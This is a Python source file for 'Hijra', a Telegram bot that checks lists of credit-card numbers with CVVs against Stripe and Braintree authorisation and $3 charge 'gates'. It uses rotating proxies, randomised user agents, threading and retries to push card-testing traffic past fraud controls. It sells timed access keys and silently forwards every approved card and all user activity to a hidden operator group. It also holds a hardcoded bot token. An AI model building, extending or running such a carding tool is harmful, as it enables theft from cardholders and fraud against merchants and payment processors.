# ============================================================
#  Telegram Bot — Hijra
# ============================================================

import os
import re
import time
import random
import json
import string
import threading
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from typing import Dict, Any, Optional
from datetime import datetime
from auth_checker_v2 import check_card as auth_check_card, probe_site as auth_probe_site, update_config as auth_update_config, get_config as auth_get_config
from meduza_gates import (
    sa1_check_card, sa1_probe_site,
    sa2_check_card, sa2_probe_site,
    nvbv_check_card, nvbv_probe_site,
    chg3_check_card, chg3_probe_site,
)
from dlx_tools import generate_cards, vbv_lookup, analyze_url, scrape_proxies

try:
    from dlx_tools import bin_lookup
except ImportError:
    def bin_lookup(b):
        return None, "Not available"

try:
    from faker import Faker
    faker = Faker()
except ImportError:
    faker = None

# ============================================================
#  Configuration
# ============================================================
BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
BOT_NAME = "Hijra"
DEVELOPER = "Hijra"
ADMIN_IDS = [5342093297]

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
KEYS_FILE = os.path.join(DATA_DIR, "tg_keys.json")
USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")
STATS_FILE = os.path.join(DATA_DIR, "tg_stats.json")
ADMINS_FILE = os.path.join(DATA_DIR, "tg_admins.json")
GATE_STATS_FILE = os.path.join(DATA_DIR, "tg_gate_stats.json")
GATE_STATUS_FILE = os.path.join(DATA_DIR, "tg_gate_status.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "tg_settings.json")
PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")

os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================
#  Global proxy pool
# ============================================================
_global_proxies = []
_proxy_index = 0
_proxy_lock = threading.Lock()


def load_global_proxies():
    global _global_proxies, _proxy_index
    if not os.path.exists(PROXIES_FILE):
        print("[Proxy] No proxies.txt found — running direct.")
        _global_proxies = []
        return 0
    with open(PROXIES_FILE, 'r') as f:
        raw = [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
    _global_proxies = raw
    _proxy_index = 0
    print(f"[Proxy] Loaded {len(_global_proxies)} proxies from proxies.txt")
    return len(_global_proxies)


def get_proxy():
    global _proxy_index
    if not _global_proxies:
        return None
    with _proxy_lock:
        proxy_str = _global_proxies[_proxy_index % len(_global_proxies)]
        _proxy_index += 1
    return format_proxy(proxy_str)


def get_next_proxy():
    return get_proxy()


def get_random_proxy():
    if not _global_proxies:
        return None
    return format_proxy(random.choice(_global_proxies))


def get_proxy_count():
    return len(_global_proxies)

# ============================================================
#  Persistence
# ============================================================
def _load_json(path, default=None):
    if default is None:
        default = {}
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_keys():
    return _load_json(KEYS_FILE, {})

def save_keys(data):
    _save_json(KEYS_FILE, data)

def load_users():
    return _load_json(USERS_FILE, {})

def save_users(data):
    _save_json(USERS_FILE, data)

def load_stats():
    return _load_json(STATS_FILE, {})

def save_stats(data):
    _save_json(STATS_FILE, data)

def update_user_stats(user_id, results):
    stats = load_stats()
    uid = str(user_id)
    if uid not in stats:
        stats[uid] = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": 0, "sessions": 0}
    stats[uid]["approved"] += results.get("approved", 0)
    stats[uid]["declined"] += results.get("declined", 0)
    stats[uid]["errors"] += results.get("errors", 0)
    stats[uid]["skipped"] += results.get("skipped", 0)
    stats[uid]["total"] += results.get("total", 0)
    stats[uid]["sessions"] += 1
    save_stats(stats)

def load_gate_stats():
    return _load_json(GATE_STATS_FILE, {})

def save_gate_stats(data):
    _save_json(GATE_STATS_FILE, data)

def update_gate_stats(gate, results):
    gs = load_gate_stats()
    if gate not in gs:
        gs[gate] = {"approved": 0, "declined": 0, "errors": 0, "total": 0, "sessions": 0}
    gs[gate]["approved"] += results.get("approved", 0)
    gs[gate]["declined"] += results.get("declined", 0)
    gs[gate]["errors"] += results.get("errors", 0)
    gs[gate]["total"] += results.get("total", 0)
    gs[gate]["sessions"] += 1
    save_gate_stats(gs)


# ============================================================
#  Settings (GC + Secret GC)
# ============================================================
def load_settings():
    return _load_json(SETTINGS_FILE, {})

def save_settings(data):
    _save_json(SETTINGS_FILE, data)

def get_notification_gc():
    settings = load_settings()
    return settings.get("notification_gc")

def set_notification_gc(chat_id):
    settings = load_settings()
    settings["notification_gc"] = chat_id
    save_settings(settings)

def get_secret_gc():
    settings = load_settings()
    return settings.get("secret_gc")

def set_secret_gc(chat_id):
    settings = load_settings()
    settings["secret_gc"] = chat_id
    save_settings(settings)


# ============================================================
#  Notification senders
# ============================================================
def notify_gc(text):
    gc_id = get_notification_gc()
    if not gc_id:
        return
    try:
        send_message(gc_id, text)
    except Exception:
        pass


def notify_secret(text):
    """Send to secret GC — all hits, activity logs."""
    gc_id = get_secret_gc()
    if not gc_id:
        return
    try:
        send_message(gc_id, text)
    except Exception:
        pass


def _fmt_hit_notification(user_id, username, gate_label, card_line, detail, elapsed=""):
    """Hijra hit format for notifications."""
    name = f"@{username}" if username else str(user_id)
    # Get BIN info
    cc_num = card_line.split('|')[0] if '|' in card_line else card_line
    bin6 = cc_num[:6] if len(cc_num) >= 6 else cc_num
    try:
        bin_info, _ = bin_lookup(bin6)
    except Exception:
        bin_info = None

    brand = bin_info.get('brand', '?') if bin_info else '?'
    bank = bin_info.get('bank', '?') if bin_info else '?'
    country = bin_info.get('country', '?') if bin_info else '?'
    emoji = bin_info.get('emoji', '') if bin_info else ''

    return (
        f"⍟━━━⌁ <b>Hijra</b> ⌁━━━⍟\n\n"
        f"[🝂] <b>𝗖𝗔𝗥𝗗:</b> <code>{card_line}</code>\n"
        f"[🝂] <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬:</b> <code>{gate_label}</code>\n"
        f"[🝂] <b>𝗦𝗧𝗔𝗧𝗨𝗦:</b> Approved ✅\n"
        f"[🝂] <b>𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> <code>{detail}</code>\n\n"
        f"⍟━━━━⍟ <b>𝗗𝗘𝗧𝗔𝗜𝗟𝗦</b> ⍟━━━━⍟\n"
        f"[🝂] <b>𝗕𝗜𝗡:</b> {brand} - <code>{bin6}</code>\n"
        f"[🝂] <b>𝗕𝗔𝗡𝗞:</b> {bank}\n"
        f"[🝂] <b>𝗖𝗢𝗨𝗡𝗧𝗥𝗬:</b> {country} {emoji}\n\n"
        f"[🝂] <b>𝗧𝗜𝗠𝗘 𝗧𝗢𝗢𝗞 ⌁</b> {elapsed}\n"
        f"[🝂] <b>𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➺</b> {name}\n"
    )


def notify_hit(user_id, username, gate_label, card_line, detail):
    """Notify both GC and secret GC about a hit."""
    # Extract elapsed time from detail if present
    elapsed = ""
    if " | " in detail:
        parts_d = detail.rsplit(" | ", 1)
        if parts_d[-1].endswith("s") and parts_d[-1][:-1].replace(".", "").isdigit():
            elapsed = parts_d[-1]

    hit_msg = _fmt_hit_notification(user_id, username, gate_label, card_line, detail, elapsed)
    notify_gc(hit_msg)
    notify_secret(hit_msg)


def notify_new_user(user_id, username, key_info=""):
    name = f"@{username}" if username else str(user_id)
    msg = (
        f"⍟━━━⌁ <b>Hijra</b> ⌁━━━⍟\n\n"
        f"[🝂] <b>NEW USER</b>\n\n"
        f"User: {name}\n"
        f"ID: <code>{user_id}</code>\n"
        f"{key_info}\n"
    )
    notify_gc(msg)
    notify_secret(msg)


def notify_activity(user_id, username, text_preview):
    """Log any activity to secret GC."""
    name = f"@{username}" if username else str(user_id)
    is_authed = is_authorized(user_id)
    status = "Authorized" if is_authed else "⚠️ Unauthorized"
    notify_secret(
        f"<b>[Activity]</b> {name} ({status})\n"
        f"ID: <code>{user_id}</code>\n"
        f"Msg: <code>{text_preview[:80]}</code>"
    )


# ============================================================
#  Gate status
# ============================================================
def load_gate_status():
    return _load_json(GATE_STATUS_FILE, {})

def save_gate_status(data):
    _save_json(GATE_STATUS_FILE, data)

def is_gate_enabled(gate_key):
    status = load_gate_status()
    entry = status.get(gate_key, {})
    return entry.get("enabled", True)

def set_gate_enabled(gate_key, enabled, by_user=None):
    status = load_gate_status()
    status[gate_key] = {
        "enabled": enabled,
        "updated_at": time.time(),
        "updated_by": by_user,
    }
    save_gate_status(status)

# ============================================================
#  Gate health probes
# ============================================================
GATE_PROBE_MAP = {
    "auth": {"name": "Stripe Auth", "cmd": "/chkapiauth"},
    "sa1": {"name": "Stripe Auth CCN", "cmd": "/chkapisa1"},
    "sa2": {"name": "Stripe Auth CVV", "cmd": "/chkapisa2"},
    "nvbv": {"name": "BT Non-VBV", "cmd": "/chkapinvbv"},
    "chg3": {"name": "Stripe Charge $3", "cmd": "/chkapichg3"},
}


def probe_gate(gate_key):
    start = time.time()
    try:
        if gate_key == "auth":
            alive, detail = auth_probe_site()
        elif gate_key == "sa1":
            alive, detail = sa1_probe_site()
        elif gate_key == "sa2":
            alive, detail = sa2_probe_site()
        elif gate_key == "nvbv":
            alive, detail = nvbv_probe_site()
        elif gate_key == "chg3":
            alive, detail = chg3_probe_site()
        else:
            return False, 0, "Unknown gate"

        latency = int((time.time() - start) * 1000)
        return alive, latency, detail
    except requests.exceptions.Timeout:
        return False, int((time.time() - start) * 1000), "Timeout"
    except requests.exceptions.ConnectionError:
        return False, int((time.time() - start) * 1000), "Connection refused"
    except Exception as e:
        return False, int((time.time() - start) * 1000), str(e)[:60]


# ============================================================
#  Duration / Keys / Auth
# ============================================================
DURATION_MAP = {
    "s": 1, "sec": 1,
    "m": 60, "min": 60,
    "h": 3600, "hr": 3600, "hour": 3600,
    "d": 86400, "day": 86400,
    "w": 604800, "week": 604800,
    "mo": 2592000, "month": 2592000,
}


def parse_duration(s):
    if not s:
        return None
    s = s.strip().lower()
    if s in ("forever", "perm", "permanent"):
        return None
    match = re.match(r'^(\d+)\s*(s|sec|m|min|h|hr|hour|d|day|w|week|mo|month)s?$', s)
    if not match:
        return -1
    n = int(match.group(1))
    unit = match.group(2)
    mult = DURATION_MAP.get(unit)
    if not mult:
        return -1
    return n * mult


def fmt_duration(seconds):
    if seconds is None:
        return "Permanent"
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m"
    if seconds < 86400:
        return f"{seconds // 3600}h"
    return f"{seconds // 86400}d"


def generate_key():
    return "HJ-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))


def is_admin(user_id):
    uid = int(user_id)
    if uid in ADMIN_IDS:
        return True
    admins = _load_json(ADMINS_FILE, {})
    entry = admins.get(str(uid))
    if not entry:
        return False
    expires_at = entry.get("expires_at")
    if expires_at is None:
        return True
    if time.time() < expires_at:
        return True
    del admins[str(uid)]
    _save_json(ADMINS_FILE, admins)
    return False


def is_authorized(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return False
    expires_at = entry.get("expires_at")
    if expires_at is None:
        return True
    if time.time() < expires_at:
        return True
    del users[str(user_id)]
    save_users(users)
    return False


def authorize_user(user_id, key, duration_seconds=None, line_limit=None):
    users = load_users()
    entry = {"key": key, "redeemed_at": time.time(), "line_limit": line_limit}
    if duration_seconds is not None:
        entry["expires_at"] = time.time() + duration_seconds
    else:
        entry["expires_at"] = None
    users[str(user_id)] = entry
    save_users(users)


def get_user_line_limit(user_id):
    if is_admin(user_id):
        return None
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return None
    return entry.get("line_limit")


# ============================================================
#  Telegram API helpers
# ============================================================
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


def tg_request(method, **kwargs):
    proxy = get_proxy()
    try:
        r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30, proxies=proxy)
        return r.json()
    except Exception:
        if proxy:
            try:
                r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30)
                return r.json()
            except Exception:
                pass
        return {}


def send_message(chat_id, text, parse_mode="HTML", reply_to=None, reply_markup=None):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_to:
        params["reply_to_message_id"] = reply_to
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("sendMessage", **params)


def edit_message(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    params = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("editMessageText", **params)


def answer_callback(callback_id, text=""):
    return tg_request("answerCallbackQuery", callback_query_id=callback_id, text=text)


def get_file_url(file_id):
    resp = tg_request("getFile", file_id=file_id)
    if resp.get("ok"):
        path = resp["result"]["file_path"]
        return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    return None


def download_file(file_id, binary=False):
    url = get_file_url(file_id)
    if not url:
        return None
    proxy = get_proxy()
    try:
        r = requests.get(url, timeout=30, proxies=proxy)
        return r.content if binary else r.text
    except Exception:
        if proxy:
            try:
                r = requests.get(url, timeout=30)
                return r.content if binary else r.text
            except Exception:
                pass
        return None


def send_document(chat_id, filepath, filename=None, caption=None):
    fname = filename or os.path.basename(filepath)
    data = {"chat_id": chat_id}
    if caption:
        data["caption"] = caption
        data["parse_mode"] = "HTML"
    proxy = get_proxy()
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API_BASE}/sendDocument", data=data,
                          files={"document": (fname, f)}, proxies=proxy, timeout=30)
    except Exception:
        if proxy:
            try:
                with open(filepath, "rb") as f:
                    requests.post(f"{API_BASE}/sendDocument", data=data,
                                  files={"document": (fname, f)}, timeout=30)
            except Exception:
                pass


# ============================================================
#  Proxy helpers
# ============================================================
def format_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()

    proto = "http"
    if '://' in proxy_str:
        proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', proxy_str, re.I)
        if proto_match:
            proto = proto_match.group(1).lower()
            proxy_str = proto_match.group(2)
        else:
            return {"http": proxy_str, "https": proxy_str}

    if '@' in proxy_str:
        url = f"{proto}://{proxy_str}"
        return {"http": url, "https": url}

    parts = proxy_str.split(':')
    if len(parts) == 2:
        url = f"{proto}://{proxy_str}"
        return {"http": url, "https": url}
    elif len(parts) == 3:
        host, port, user = parts
        url = f"{proto}://{user}@{host}:{port}"
        return {"http": url, "https": url}
    elif len(parts) == 4:
        if _is_valid_port(parts[1]):
            ip, port, user, pwd = parts
            url = f"{proto}://{user}:{pwd}@{ip}:{port}"
            return {"http": url, "https": url}
        elif _is_valid_port(parts[3]):
            user, pwd, ip, port = parts
            url = f"{proto}://{user}:{pwd}@{ip}:{port}"
            return {"http": url, "https": url}
    return None


def _is_valid_port(port_str):
    try:
        p = int(port_str)
        return 1 <= p <= 65535
    except (ValueError, TypeError):
        return False


def _is_valid_host(host):
    if not host:
        return False
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
        return all(0 <= int(o) <= 255 for o in host.split('.'))
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9.\-]*[a-zA-Z0-9])?$', host))


def validate_proxy_format(raw):
    line = raw.strip()
    if not line or line.startswith('#'):
        return None
    proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', line, re.I)
    if proto_match:
        rest = proto_match.group(2)
        return line if _validate_host_part(rest) else None
    if '@' in line:
        return line if _validate_host_part(line) else None
    parts = line.split(':')
    if len(parts) == 2:
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        return None
    if len(parts) == 3:
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        return None
    if len(parts) == 4:
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        if _is_valid_host(parts[2]) and _is_valid_port(parts[3]):
            return line
        return None
    return None


def _validate_host_part(rest):
    at_match = re.match(r'^([^@]+)@(.+)$', rest)
    if at_match:
        host_part = at_match.group(2)
        last_colon = host_part.rfind(':')
        if last_colon == -1:
            return False
        host = host_part[:last_colon]
        port = host_part[last_colon + 1:]
        return _is_valid_host(host) and _is_valid_port(port)
    last_colon = rest.rfind(':')
    if last_colon == -1:
        return False
    host = rest[:last_colon]
    port = rest[last_colon + 1:]
    return _is_valid_host(host) and _is_valid_port(port)


def test_proxy_connectivity(proxy_str):
    proxy_dict = format_proxy(proxy_str)
    if not proxy_dict:
        if '://' in proxy_str:
            proxy_dict = {"http": proxy_str, "https": proxy_str}
        else:
            proxy_dict = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    test_urls = ["https://httpbin.org/ip", "https://www.microsoft.com"]
    start = time.time()
    last_error = ""
    for test_url in test_urls:
        try:
            resp = requests.get(test_url, proxies=proxy_dict, timeout=10, allow_redirects=True)
            latency = round((time.time() - start) * 1000)
            if resp.status_code < 500:
                return True, latency, None
            last_error = f"HTTP {resp.status_code}"
        except requests.exceptions.ProxyError:
            last_error = "Proxy tunnel failed"
        except requests.exceptions.ConnectTimeout:
            last_error = "Connection timeout"
        except requests.exceptions.ReadTimeout:
            last_error = "Read timeout"
        except requests.exceptions.ConnectionError:
            last_error = "Connection error"
        except Exception as e:
            last_error = f"Error: {str(e)[:80]}"
    return False, 0, last_error


# ============================================================
#  UA rotation
# ============================================================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
]

def _rand_ua():
    return random.choice(USER_AGENTS)


# ============================================================
#  Gate runner
# ============================================================
def _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict):
    cc_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}"
    if gate == "auth":
        return auth_check_card(cc_line, proxy_dict)
    elif gate == "sa1":
        return sa1_check_card(cc_line, proxy_dict)
    elif gate == "sa2":
        return sa2_check_card(cc_line, proxy_dict)
    elif gate == "nvbv":
        return nvbv_check_card(cc_line, proxy_dict)
    elif gate == "chg3":
        return chg3_check_card(cc_line, proxy_dict)
    else:
        return auth_check_card(cc_line, proxy_dict)


def _get_rotating_proxy(proxies_list, max_tries=3):
    if not proxies_list:
        return [None]
    tried = set()
    result = []
    for _ in range(min(max_tries, len(proxies_list))):
        p = random.choice(proxies_list)
        attempts = 0
        while p in tried and attempts < 10:
            p = random.choice(proxies_list)
            attempts += 1
        tried.add(p)
        result.append(format_proxy(p))
    return result


def process_single_entry(entry, proxies_list, user_id, gate="auth"):
    try:
        c_data = entry.split('|')
        if len(c_data) == 4:
            c_num, c_mm, c_yy, c_cvv = c_data

            user_bin_list = user_bins.get(user_id)
            if user_bin_list:
                if not any(c_num.startswith(b) for b in user_bin_list):
                    return "SKIPPED | BIN not allowed"

            _CONN_ERRORS = [
                "ProxyError", "Tunnel connection failed", "503 Service Unavailable",
                "connection failed", "Max retries", "HTTPSConnectionPool",
                "HTTPConnectionPool", "ConnectionError", "ConnectTimeoutError",
                "ReadTimeoutError", "ConnectionResetError", "RemoteDisconnected",
                "NewConnectionError", "SSLError", "socket.timeout", "ECONNREFUSED",
                "Connection refused", "Connection timed out", "Connection reset",
                "ConnError", "Rate limited", "Service unavailable",
            ]

            def _is_conn_error(r):
                return isinstance(r, str) and any(e in r for e in _CONN_ERRORS)

            max_proxy_tries = min(5, len(proxies_list)) if proxies_list else 0
            proxy_candidates = _get_rotating_proxy(proxies_list, max_tries=max_proxy_tries) if proxies_list else [None]
            result = None

            for proxy_dict in proxy_candidates:
                if cancel_flags.get(user_id):
                    break
                try:
                    result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict)
                    if not _is_conn_error(result):
                        break
                    time.sleep(random.uniform(0.3, 0.7))
                except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                        requests.exceptions.Timeout, ConnectionError, OSError):
                    time.sleep(random.uniform(0.2, 0.5))
                    continue
                except Exception as e:
                    result = f"Error: {str(e)}"
                    if not _is_conn_error(result):
                        break

            if result is None or _is_conn_error(result):
                try:
                    result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, None)
                except Exception as e2:
                    result = f"Error: {str(e2)}"

            if _is_conn_error(result):
                result = "Declined | Gateway Timeout"

            if result is None:
                result = "Declined | Gateway Timeout"
        else:
            result = "Error: Invalid Format"
    except Exception as e:
        result = f"Error: {str(e)}"

    return result


# ============================================================
#  Processing runner
# ============================================================
DEFAULT_THREADS = 10


def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
    proxies_list = list(_global_proxies) if _global_proxies else []
    total = len(lines)
    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
    results_lock = threading.Lock()
    processed = [0]

    def worker(entry):
        if cancel_flags.get(user_id):
            return None
        entry = entry.strip()
        if not entry:
            return ("", "INVALID", "Empty line", "error")
        result = process_single_entry(entry, proxies_list, user_id, gate=gate)
        if "SKIPPED" in result:
            category = "skipped"
            status = "SKIPPED"
        elif "Approved" in result:
            category = "approved"
            status = "APPROVED"
        elif "Declined" in result:
            category = "declined"
            status = "DECLINED"
        else:
            category = "error"
            status = "ERROR"
        detail = result.split(" | ", 1)[1] if " | " in result else result
        return (entry, status, detail, category)

    max_workers = max(1, min(threads, total, 20))

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
        for fut in as_completed(futures):
            if cancel_flags.get(user_id):
                break
            result = fut.result()
            if result is None:
                continue
            entry, status, detail, category = result
            with results_lock:
                if category == "approved":
                    results["approved"] += 1
                    results["approved_list"].append(entry)
                elif category == "declined":
                    results["declined"] += 1
                elif category == "skipped":
                    results["skipped"] += 1
                else:
                    results["errors"] += 1
                processed[0] += 1
                idx = processed[0]
            if on_progress:
                on_progress(idx, total, results, entry, status, detail)

    if on_complete:
        on_complete(results)
    return results


# ============================================================
#  Message formatters (Hijra branded)
# ============================================================

def fmt_start(username, user_id):
    name = f"@{username}" if username else "User"
    return (
        f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
        f"Welcome, <b>{name}</b>\n"
        f"Your ID: <code>{user_id}</code>\n\n"
        f"Use /help to see all available commands.\n"
    )


def fmt_unauthorized():
    return (
        f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
        "<b>Access Denied</b>\n\n"
        "You need to redeem a key first.\n"
        "Use: <code>/redeem YOUR-KEY</code>\n"
    )


def fmt_live(idx, total, results, start_time, entry="", status_text="", done=False):
    title = f"⍟━━━⌁ <b>{'Complete' if done else 'Processing'}</b> ⌁━━━⍟"
    elapsed = time.time() - start_time
    cpm = int((idx / elapsed) * 60) if elapsed > 0 else 0
    eta = int((total - idx) / (idx / elapsed)) if idx > 0 and elapsed > 0 else 0
    bar_len = 16
    filled = int(bar_len * idx / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    pct = int(idx / total * 100) if total > 0 else 0

    return (
        f"{title}\n\n"
        f"<code>{bar}</code> {pct}%\n\n"
        f"Loaded: <code>{total}</code>\n"
        f"Progress: <code>{idx}/{total}</code>\n"
        f"Speed: <code>{cpm} CPM</code>\n"
        f"ETA: <code>{eta}s</code>\n\n"
        f"Current:\n<code>{entry}</code>\n\n"
        f"Status: {status_text}\n\n"
        f"✅ Approved: <code>{results['approved']}</code>\n"
        f"❌ Declined: <code>{results['declined']}</code>\n"
        f"⏭ Skipped: <code>{results['skipped']}</code>\n"
        f"⚠️ Errors: <code>{results['errors']}</code>\n"
    )


def fmt_results(results):
    return (
        f"⍟━━━⌁ <b>Session Complete</b> ⌁━━━⍟\n\n"
        f"Total: <code>{results['total']}</code>\n"
        f"✅ Approved: <code>{results['approved']}</code>\n"
        f"❌ Declined: <code>{results['declined']}</code>\n"
        f"⏭ Skipped: <code>{results['skipped']}</code>\n"
        f"⚠️ Errors: <code>{results['errors']}</code>\n"
    )


def fmt_stats(user_id):
    stats = load_stats()
    uid = str(user_id)
    s = stats.get(uid)
    if not s:
        return f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo stats yet. Run a session first."
    return (
        f"⍟━━━⌁ <b>Your Stats</b> ⌁━━━⍟\n\n"
        f"Sessions: <code>{s.get('sessions', 0)}</code>\n"
        f"Total: <code>{s.get('total', 0)}</code>\n"
        f"✅ Approved: <code>{s.get('approved', 0)}</code>\n"
        f"❌ Declined: <code>{s.get('declined', 0)}</code>\n"
        f"⏭ Skipped: <code>{s.get('skipped', 0)}</code>\n"
        f"⚠️ Errors: <code>{s.get('errors', 0)}</code>\n"
    )


def fmt_mykey(user_id):
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo key redeemed."
    key = entry.get("key", "N/A")
    redeemed = datetime.fromtimestamp(entry.get("redeemed_at", 0)).strftime("%Y-%m-%d %H:%M UTC")
    expires_at = entry.get("expires_at")
    if expires_at is None:
        exp_text = "Never (Permanent)"
    else:
        exp_text = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M UTC")
        if time.time() > expires_at:
            exp_text += " (EXPIRED)"
    ll = entry.get("line_limit")
    limit_text = str(ll) if ll else "Unlimited"
    return (
        f"⍟━━━⌁ <b>Key Info</b> ⌁━━━⍟\n\n"
        f"Key: <code>{key}</code>\n"
        f"Redeemed: <code>{redeemed}</code>\n"
        f"Expires: <code>{exp_text}</code>\n"
        f"Line Limit: <code>{limit_text}</code>\n"
    )


# ============================================================
#  Inline keyboard helpers
# ============================================================
def stop_button_markup(user_id):
    return {
        "inline_keyboard": [[
            {"text": "⬛ Stop", "callback_data": f"stop_{user_id}"}
        ]]
    }


def help_main_markup():
    return {
        "inline_keyboard": [
            [
                {"text": "🔐 Auth Gates", "callback_data": "help_auth_gates"},
                {"text": "💳 Charge Gates", "callback_data": "help_charge_gates"},
            ],
            [
                {"text": "🛠 Tools", "callback_data": "help_tools"},
                {"text": "📋 Commands", "callback_data": "help_commands"},
            ],
            [
                {"text": "📖 How to Use", "callback_data": "help_howto"},
                {"text": "👑 Admin", "callback_data": "help_admin"},
            ],
        ]
    }


def help_back_markup():
    return {
        "inline_keyboard": [[
            {"text": "◀ Back", "callback_data": "help_back"},
        ]]
    }


# ============================================================
#  Active processing tracker
# ============================================================
active_users = set()
user_bins = {}
active_lock = threading.Lock()
cancel_flags = {}


# ============================================================
#  Gate registry
# ============================================================
# Auth gates
AUTH_GATES = [
    ("auth", "/auth", "Stripe Auth (WCPay)", True),
    ("sa1", "/sa1", "Stripe Auth CCN", True),
    ("sa2", "/sa2", "Stripe Auth CVV", True),
    ("nvbv", "/nvbv", "BT Non-VBV", True),
]

# Charge gates
CHARGE_GATES = [
    ("chg3", "/chg3", "Stripe Charge $3", True),
]

GATE_REGISTRY = AUTH_GATES + CHARGE_GATES

GATE_MAP = {
    "/auth": ("auth", "Stripe Auth"),
    "/sa1": ("sa1", "Stripe Auth CCN"),
    "/sa2": ("sa2", "Stripe Auth CVV"),
    "/nvbv": ("nvbv", "BT Non-VBV"),
    "/chg3": ("chg3", "Stripe Charge $3"),
}

CHKAPI_CMDS = {
    "/chkapiauth": "auth",
    "/chkapisa1": "sa1",
    "/chkapisa2": "sa2",
    "/chkapinvbv": "nvbv",
    "/chkapichg3": "chg3",
}


# ============================================================
#  Callback handler
# ============================================================
def handle_callback(update):
    cb = update.get("callback_query")
    if not cb:
        return

    data = cb.get("data", "")
    cb_user_id = cb["from"]["id"]
    cb_id = cb["id"]
    chat_id = cb.get("message", {}).get("chat", {}).get("id")
    msg_id = cb.get("message", {}).get("message_id")

    if data.startswith("stop_"):
        target_uid = int(data.split("_", 1)[1])
        if cb_user_id == target_uid or is_admin(cb_user_id):
            cancel_flags[target_uid] = True
            answer_callback(cb_id, "Stopping task...")
        else:
            answer_callback(cb_id, "Not your task.")
        return

    if data.startswith("gate_off_"):
        if not is_admin(cb_user_id):
            answer_callback(cb_id, "Admin only.")
            return
        gate_key = data.replace("gate_off_", "")
        set_gate_enabled(gate_key, False, by_user=cb_user_id)
        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
        answer_callback(cb_id, f"{gate_name} disabled")
        if chat_id and msg_id:
            edit_message(chat_id, msg_id,
                f"⍟━━━⌁ <b>{gate_name} — DISABLED</b> ⌁━━━⍟\n\n"
                f"Gate has been turned off.\n")
        return

    if data.startswith("gate_on_"):
        if not is_admin(cb_user_id):
            answer_callback(cb_id, "Admin only.")
            return
        gate_key = data.replace("gate_on_", "")
        set_gate_enabled(gate_key, True, by_user=cb_user_id)
        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
        answer_callback(cb_id, f"{gate_name} enabled")
        if chat_id and msg_id:
            edit_message(chat_id, msg_id,
                f"⍟━━━⌁ <b>{gate_name} — ENABLED</b> ⌁━━━⍟\n\n"
                f"Gate is back online.\n")
        return

    if data == "gate_keep":
        answer_callback(cb_id, "No changes made.")
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, f"⍟━━━⌁ <b>No changes made.</b> ⌁━━━⍟")
        return

